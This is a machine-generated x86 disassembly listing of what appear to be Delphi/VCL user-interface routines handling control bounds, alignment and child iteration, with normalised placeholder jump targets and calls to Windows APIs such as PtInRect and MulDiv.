lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_412d30
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43716c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439638
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_439528
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_43df6c
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_4395ac
pop ecx
jmp r-xdata
sub_439698
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_439786
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43978d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
test bl bl
je r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_4377dc
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4377ac
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
cmp al 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4377ac
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_40445c
jne r-xdata
lea eax [ esi + 0x80 ]
mov edx [ edi + 0x7c ]
call sub_4040a4
cmp [ esi + 0x80 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_4376cc
cmp [ esi + 0x57 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x120 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x124 ] eax
cmp [ esi + 0x122 ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_439794
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp esi eax
jne r-xdata
pop esi
pop ebx
retn
xor ecx ecx
mov edx esi
mov eax ebx
mov si 0xffef
call sub_403490
sub_4397c0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4397e0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_439800
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_439820
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_439840
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_439860
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_439880
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41ad94
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
mov eax ebx
call sub_436e00
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403490
sub_4398b8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_439954
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414850
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov edi esi
mov eax edi
call sub_443c80
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_443db8
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4377ac
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_443b18
mov dl [ ebx + 0x57 ]
mov eax edi
call sub_443ed8
push [ ebx + 0x124 ]
push [ ebx + 0x120 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43995b
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_439964
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov ecx edx
test ecx ecx
jle r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov esi 0x1
mov edx [ ebp - 0x4 ]
add edx 0x8
inc esi
add edx 0x8
dec ecx
jne r-xdata
mov ebx esi
fld [ edx ]
mov eax [ ebp - 0x4 ]
fcomp [ eax + ebx * 8 ]
fnstsw ax
sahf
jae r-xdata
sub_4399a0
push ebx
push esi
push edi
push ebp
add esp 0xffffffc8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor ebx ebx
mov esi [ eax + 0x48 ]
mov edi [ eax + 0x4c ]
mov eax [ esp ]
test eax eax
jg r-xdata
cmp esi eax
jg r-xdata
mov bl 0x3
jmp r-xdata
mov edx [ esp + 0x4 ]
test edx edx
jg r-xdata
mov bl 0x4
jmp r-xdata
mov eax ebx
add esp 0x38
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi edx
jg r-xdata
mov bl 0x1
jmp r-xdata
mov ebp edx
sub edi edx
mov [ esp + 0x8 ] eax
sub esi eax
fild [ esp + 0x8 ]
fstp [ esp + 0xc ]
fwait
mov [ esp + 0x2c ] esi
fild [ esp + 0x2c ]
fstp [ esp + 0x14 ]
fwait
mov [ esp + 0x30 ] ebp
fild [ esp + 0x30 ]
fstp [ esp + 0x1c ]
fwait
mov [ esp + 0x34 ] edi
fild [ esp + 0x34 ]
fstp [ esp + 0x24 ]
fwait
lea eax [ esp + 0xc ]
mov edx 0x3
call sub_439964
sub eax 0x1
jb r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x3
jmp r-xdata
je r-xdata
mov bl 0x4
jmp r-xdata
dec eax
je r-xdata
mov bl 0x1
jmp r-xdata
dec eax
je r-xdata
mov bl 0x2
jmp r-xdata
sub_439a50
push ebx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edx eax
mov eax [ ebx + 0xa0 ]
call sub_403420
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_439a84
push ebx
test [ eax + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
mov edx [ eax + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_439ad0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_439afc
push ebx
push esi
push edi
push ebp
add esp 0xffffffd4
mov ebp edx
mov edi eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
add esp 0x2c
pop ebp
pop edi
pop esi
pop ebx
retn
test [ edi + 0x1c ] 0x10
je r-xdata
mov edx esp
mov eax [ ebp + 0x8 ]
call sub_4069f0
mov eax esp
call sub_412d58
test al al
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_4372f0
push [ esp + 0xc ]
push [ esp + 0xc ]
lea edx [ esp + 0x1c ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
mov [ esp + 0x10 ] 0x0
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x8 ]
mov eax edi
mov si 0xffe6
call sub_403490
xor eax eax
mov al [ esp + 0x10 ]
mov [ ebp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov eax edi
mov si 0xffd6
call sub_403490
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x61 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor edx edx
mov eax edi
call sub_43731c
mov [ ebx + 0x64 ] edi
mov eax esp
call sub_412d58
test al al
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov [ ebp + 0xc ] 0x1
lea ecx [ esp + 0x24 ]
xor edx edx
xor eax eax
call sub_412ce0
lea edx [ esp + 0x24 ]
mov ecx esp
mov eax edi
call sub_4372c4
sub_439c24
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push ecx
mov ebx eax
mov edx eax
lea ecx [ esp + 0x4 ]
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
sub_439c64
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4364f0
mov eax esi
mov edx [ r-xdata ]
call sub_403444
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_439c98
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_439d90
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_4368ac
push ebx
push sub_43b728
call sub_41b9d4
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41dfdc
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_41e184
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_4035a0
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454d2c
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_4040a4
lea eax [ ebx + 0x188 ]
call sub_404050
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439d97
lea eax [ ebp - 0x8 ]
call sub_404050
retn
sub_439d97
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_439dbc
push ebx
push esi
push edi
call sub_403608
mov ebx edx
mov edi eax
mov eax edi
call sub_41abe4
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_40568c
mov eax [ edi + 0x178 ]
call sub_403294
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_435458
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_43aa5c
mov eax edi
call sub_43ac9c
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_403294
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_43ac60
mov esi eax
mov edx esi
mov eax edi
call sub_43aac8
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_43ac9c
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_436984
test bl bl
jle r-xdata
call sub_41ba6c
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035f0
sub_439e8c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_439f50
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_414368
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403294
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_43e12c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_414170
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_4142bc
mov edx esi
mov eax [ ebp - 0xc ]
call sub_414170
test eax eax
je r-xdata
sub_439f60
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43a804
xor eax eax
push ebp
push sub_439fa0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_436be8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439fa7
mov eax [ ebp - 0x4 ]
call sub_43a80c
retn
sub_439fa7
mov eax [ ebp - 0x4 ]
call sub_439e8c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43b660
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_438978
sub_439fdc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_439ff7 ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_43a068
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43e270
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_412ce0
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_43a3e9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a3f0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_43a2fe ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_43a261
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_43a3f0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_43a41f ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_43a4a8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43ac9c
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_414014
mov eax [ ebp + 0x8 ]
